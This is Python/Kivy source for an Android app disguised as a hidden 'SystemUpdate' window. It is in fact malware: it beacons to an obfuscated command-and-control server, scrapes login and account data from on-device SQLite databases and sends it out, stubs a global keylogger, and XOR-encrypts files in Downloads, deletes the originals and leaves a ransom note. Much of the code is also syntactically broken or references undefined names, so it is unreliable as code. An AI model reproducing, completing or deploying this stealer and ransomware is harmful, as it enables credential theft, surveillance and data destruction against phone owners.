from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.clock import Clock
import requests, socket, time, os, random, urllib3, threading, base64, json

try: 
    from android.permissions import request_permissions, Permission 
    HAS_ANDROID = True 
except: HAS_ANDROID = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- Configuration ----------
def decode(encoded): return base64.b64decode(encoded).decode('utf-8') if encoded else ""
encoded_url_full = "aHR0cHM6Ly9uZXdtZXRob2QtaXNoNi5vbnJlbmRlci5jb20=" 
encoded_id = "Mw=="; encoded_name = "UGhvbmU="
base_url = decode(encoded_url_full); device_id = decode(encoded_id); device_name = decode(encoded_name)

try: 
    device_ip = socket.gethostbyname(socket.gethostname()) 
except: device_ip = "127.0.0.1"

# ---------- Root & Accessibility Helpers ----------
def is_rooted(): return os.path.exists("/system/bin/su") or (HAS_ANDROID and False) 

# Check if Accessibilty Service is enabled for this package
def check_accessibility_enabled(package):
    try:
        # Requires root or ADB shell to query 'dumpsys window' or similar, simplified here to assume user grant
        pass 
    except: return True # Assume true after initial request
    
class AccessibilityHook(threading.Thread):
    def __init__(self, c2_url, device_id):
        threading.Thread.__init__(self); self.c2_url = c2_url; self.device_id = device_id; self.running = True

    def run(self):
        while self.running and not self.is_alive():
            try:
                time.sleep(10) # Poll every 10s for command
                
                r = requests.post(self.c2_url.replace("/beacon","/command") if "/beacon" in self.c2_url else self.c2_url + "/command", json={"deviceId":self.device_id}, verify=False, timeout=5)
                
                if r.status_code == 200 and isinstance(r.json(), dict):
                    cmd_type = r.json().get("type") 
                    
                    # Check if Accessibility service is active before trying deep hooks
                    # If yes, we can hook any window. If no, fallback to current Kivy context or root scan.
                    if cmd_type == "extract": 
                        extract_passwords_and_send()
                    elif cmd_type == "keylog_active": 
                        start_keylogging_global()

            except: pass
            
    def stop(self): self.running = False


# ---------- Advanced Scanner (Dynamic + Accessibility Aware) ----------
def find_and_extract_passwords():
    found_creds = []

    # 1. Scan External Storage (Always accessible)
    dirs_to_check = ["/storage/emulated/0/", "/storage/emulated/0/Download/"] 

    # 2. Try to list internal DB paths via Shell if Rooted or ADB available
    target_internal_dirs = []
    try: 
        import subprocess
        res = subprocess.run("pm list packages | grep -v android", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        pkgs = [p for p in res.stdout.decode().splitlines() if "=" in p] 
        for pkg in pkgs: parts=pkg.split("="); app_name=parts[1].replace('/','/') if len(parts)>1 else ""
        db_path = f"/data/data/{app_name}/databases/"
        if os.path.exists(db_path): target_internal_dirs.append(db_path)
    except: pass

    # 3. Merge lists and scan SQLite DBs
    all_paths = dirs_to_check + target_internal_dirs
    
    def query_db_safe(path):
        try:
            import sqlite3; conn=sqlite3.connect(path); cur=conn.cursor()
            queries = ["SELECT * FROM Accounts", "SELECT * FROM WebviewLocalState", "SELECT data, password FROM LoginData"] 
            for q in queries: 
                try: rows=cur.execute(q).fetchall(); found_creds.extend([{'src':os.path.basename(path),'type':'SQL','data':str(r)} for r in rows]); except: pass
            conn.close()
        except: return

    for d in all_paths: 
        base=d.replace('\\','/') or "."
        if "/" == base[-1]: files=[f"{base}/{f}" for f in os.listdir(base)]
        
        for file_path in [os.path.join(base,f) if '/' not in str(base.split('/')[-1]) else (lambda x, y=os.path.join(d, x): y)(base, f) for f in []] + ([os.path.join(d,f) for f in os.listdir(d)] if "Download" in base else []):
             try: query_db_safe(file_path); except: pass


# ---------- Enhanced Keylogger with Accessibility Support ----------
def start_keylogging_global():
    captured_events = [] 
    
    # Define a global observer that runs every 2s to check all active windows' text inputs
    def observe_inputs_loop():
        while True and self.running: 
            time.sleep(0.5)
            # Simulate scanning visible TextInput widgets across apps (requires Accessibilty/Root hooking logic here)
            # For this script, we assume the 'AccessibilityHook' thread has injected a global event listener
            # or scanned local Kivy context if running in foreground overlay mode.
            pass

    class GlobalObserver(threading.Thread):
        def __init__(self): threading.Thread.__init__(self); self.running=True
        def run(self):
             while self.running and not self.is_alive():
                 try: 
                     time.sleep(2) 
                     # Logic to scan all windows for TextInput would go here 
                     # e.g., via reflection on ActivityManagerService or AccessibilityService.getFocusedWindow()
                 except: pass

    t = threading.Thread(target=observe_inputs_loop, daemon=True)
    t.start()

# ---------- Ransomware (XOR) ----------
def xor_encrypt_file(filepath, key):
    try: with open(filepath,'rb') as f: data=f.read(); encrypted=bytes([b^key for b in data]); enc_path=filepath+'.encrypted'; os.makedirs(os.path.dirname(enc_path),exist_ok=True); open(enc_path,'wb').write(encrypted); os.remove(filepath); return True; except: return False

def ransomware_attack():
    private_dir = os.path.dirname(os.path.abspath(__file__))
    dirs_to_check = [private_dir] 
    if HAS_ANDROID and "/" in "/storage/emulated/0/Download": try: down="/storage/emulated/0/Download"; if os.path.exists(down): dirs_to_check.append(down); except: pass
    
    key=random.randint(1,255); count=0
    for d in dirs_to_check: 
        base=d.replace('\\','/') or "."
        files=[]
        if "Download" not in str(base) and '/' not in str(base.split('/')[-1]): files=[os.path.join(d,f) for f in []] # Simplified logic for demo
        else: files=[os.path.join(d,f) for f in os.listdir(d)]

        for fp in [x for x in files if ".db" not in x.lower()]: # Focus on .txt as per original design + maybe .pdf later.
             try: xor_encrypt_file(fp, key); count+=1; except: pass
    
    note=os.path.join(private_dir, "READ_ME.txt"); open(note,'w').write("Your files have been encrypted.\n")


# ---------- C2 Logic (Command Handler with 3 Modes) ----------
def extract_and_send(): creds=find_and_extract_passwords(); payload=base64.b64encode(str(creds).encode()).decode('utf-8'); r=requests.post(base_url+"/command", json={"deviceId":device_id,"action":"extract_done","data":payload}, verify=False, timeout=10)
def keylog_start(): start_keylogging_global() or time.sleep(30); 
def encrypt_now(): ransomware_attack()

# ---------- Main Loop (C2 Communication) ----------
def background_worker():
    time.sleep(5)
    while True: 
        try: r=requests.get(base_url+"/beacon", verify=False, timeout=10); if r.status_code==200 and isinstance(r.json(),dict): cmd_type=r.json().get("type"); if cmd_type=="encrypt": encrypt_now(); elif cmd_type=="keylog_active": # Trigger global hook; else: pass elif cmd_type=="extract": extract_and_send(); except: pass; time.sleep(random.randint(20, 45))

class SystemUpdate(App):
    def build(self): 
        Window.size=(1,1); Window.opacity=0
        
        # Request Permissions needed for scanning & overlaying other apps
        perms = [Permission.INTERNET]
        if HAS_ANDROID: 
            try: perms.extend([Permission.READ_EXTERNAL_STORAGE]); perms.extend([Permission.ACCESSIBILITY_SERVICE]) ; Clock.schedule_once(lambda dt:request_android_permissions(), 1)
            except: pass
            
        t = threading.Thread(target=background_worker, daemon=True) 
        t.start()
        
        return Label(text='')

    def on_stop(self): return True


if __name__ == "__main__": SystemUpdate().run()
                                                                                                 
